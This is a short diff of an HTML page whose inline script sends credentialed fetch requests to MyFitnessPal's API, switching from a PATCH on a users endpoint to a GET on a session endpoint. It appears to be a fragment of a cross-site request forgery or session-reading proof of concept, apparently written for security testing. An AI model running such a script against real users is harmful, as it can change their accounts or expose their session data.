@@ -6,8 +6,8 @@
 </head>
 <body>
 <script>
-fetch("https://www.myfitnesspal.com/api/services/users", {
-  method: "PATCH",
+fetch("https://www.myfitnesspal.com/api/auth/session", {
+  method: "GET",
   credentials: "include",
   headers: {
     "Content-Type": "application/json"
